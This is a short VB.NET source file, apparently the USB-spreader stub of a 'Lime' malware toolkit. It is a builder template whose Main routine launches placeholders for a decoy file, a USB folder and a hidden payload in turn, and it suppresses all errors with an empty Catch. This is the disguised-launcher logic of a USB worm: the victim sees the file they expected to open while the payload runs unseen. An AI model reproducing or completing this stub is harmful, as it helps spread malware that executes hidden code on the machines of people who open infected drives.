Imports System
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices

<Assembly: AssemblyTrademark("%Lime%")>
<Assembly: Guid("%Guid%")>

Module LimeUSBModule

    Public Sub Main()
        Try
            Process.Start("%File%")
            Process.Start("%USB%")
            Process.Start("%Payload%")
        Catch
        End Try
    End Sub
End Module